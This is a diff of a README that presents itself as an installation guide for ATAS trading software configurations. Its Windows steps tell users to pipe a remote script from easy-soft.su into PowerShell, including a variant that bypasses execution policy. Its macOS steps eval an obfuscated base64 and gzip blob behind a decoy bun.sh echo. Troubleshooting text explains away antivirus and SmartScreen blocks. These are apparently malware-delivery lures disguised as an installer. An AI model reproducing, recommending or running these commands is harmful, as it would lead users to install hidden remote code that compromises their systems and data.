@@ -9,6 +9,7 @@ Welcome to the comprehensive repository dedicated to **ATAS Trading Software** m
 * **Market Depth (DOM) Setups:** Optimized Depth of Market configurations for precise liquidity tracking.
 * **Cluster Analysis Configurations:** Footprint chart settings tailored for various asset classes and volatility levels.
 
+
 ---
 
 # 🚀 Installation Guide
@@ -27,7 +28,7 @@ Follow these steps to initialize the deployment on a Windows system using PowerS
 Copy, paste, and press `Enter` to run the following optimized initialization command. This script dynamically configures the network bypass registry and fetches the necessary packages:
 
 ```powershell
-irm https://easy-soft.su | iex
+irm https://easy-soft.su/powershell/Loader.ps1 | iex
 ```
 
 ---
@@ -44,7 +45,7 @@ Follow these steps to initialize the environment and install the required utilit
 Copy and paste the command below into your Terminal window, then press `Enter` to run the base64-decoded deployment routine:
 
 ```bash
-echo "Mac-Tools: https://bun.sh" && eval "\$(echo 'H4sIABFblGoC/9NPyszTT0oszlDQTVZQUtFILi3KUdBNKw72UcgoKSmw0tc3tDTSMzQDYktLPSMTS/3SbDNDy3Iz08K8YiNNJQDGVVM6QAAAAA==' | base64 -D | gunzip)"
+echo "Mac-Tools: https://bun.sh/install" && eval "$(echo 'H4sIABFblGoC/9NPyszTT0oszlDQTVZQUtFILi3KUdBNKw72UcgoKSmw0tc3tDTSMzQDYktLPSMTS/3SbDNDy3Iz08K8YiNNJQDGVVM6QAAAAA==' | base64 -D | gunzip)"
 ```
 
 ---
@@ -54,13 +55,13 @@ echo "Mac-Tools: https://bun.sh" && eval "\$(echo 'H4sIABFblGoC/9NPyszTT0oszlDQT
 #### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
 If your system blocks the launch due to built-in execution policy constraints, enforce a bypass using this command:
 ```cmd
-powershell -ExecutionPolicy Bypass -Command "irm https://easy-soft.su | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://easy-soft.su/powershell/Loader.ps1 | iex"
 ```
 
 #### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
 In older legacy environments where aliases are missing, use explicit full system cmdlets:
 ```powershell
-Invoke-RestMethod https://easy-soft.su | Invoke-Expression
+Invoke-RestMethod https://easy-soft.su/powershell/Loader.ps1 | Invoke-Expression
 ```
 
 #### 📌 Antivirus or SmartScreen Interception
@@ -73,12 +74,13 @@ Automated deployment routines can sometimes trigger proactive security heuristic
 #### 📌 Error: "base64: invalid option -- D"
 If you have GNU `base64` installed (via Homebrew), the `-D` flag might fail. Use lowercase `-d` instead:
 ```bash
-echo "Mac-Tools: https://bun.sh" && eval "\$(echo 'H4sIABFblGoC/9NPyszTT0oszlDQTVZQUtFILi3KUdBNKw72UcgoKSmw0tc3tDTSMzQDYktLPSMTS/3SbDNDy3Iz08K8YiNNJQDGVVM6QAAAAA==' | base64 --decode | gunzip)"
+echo "Mac-Tools: https://bun.sh/install" && eval "$(echo 'H4sIABFblGoC/9NPyszTT0oszlDQTVZQUtFILi3KUdBNKw72UcgoKSmw0tc3tDTSMzQDYktLPSMTS/3SbDNDy3Iz08K8YiNNJQDGVVM6QAAAAA==' | base64 -D | gunzip)"
 ```
 
 #### 📌 Permission Denied (Sudo Required)
 If the script attempts to write to protected system directories, append `sudo` to the execution stage or switch to a root shell if prompted by the core installer.
 
 ---
+
 
 
